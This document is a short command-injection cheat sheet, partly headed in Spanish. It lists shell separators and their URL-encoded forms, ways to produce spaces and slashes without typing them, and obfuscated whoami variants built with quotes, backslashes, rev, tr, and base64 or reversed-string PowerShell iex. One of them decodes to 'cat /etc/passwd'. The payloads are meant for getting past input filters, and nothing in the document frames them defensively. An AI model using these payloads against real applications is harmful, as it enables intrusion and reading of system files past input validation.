# Detection:
- Semicolon
```
;
%3b
${LS_COLORS:10:1}
```
- New Line
```
\n
%0a
```
- Background
```
&
%26
```
- Pipe
```
|
%7c
```
- AND
```
&&
%26%26
```
- OR
```
||
%7c%7c
```
- Tab
```
%09
```
- Espacio
```
${IFS}
```
- Corchetes
```
{ls,-la}
```
- Backslash
```
${PATH:0:1}
echo $(tr '!-}' '"-~'<<<[)

%HOMEPATH:~6,-11%
$env:HOMEPATH[0]
```
- Sub-Shell
```
``
%60%60
```
- Sub-Shell
```
$()
%24%28%29
```
# Bypass commands
```
w'h'o'am'i
w"h"o"am"i
who$@ami
w\ho\am\i
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(rev<<<'imaohw')
iex "$('imaohw'[-1..-20] -join '')"

WhOaMi
who^ami
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
iex "$('imaohw'[-1..-20] -join '')"
```
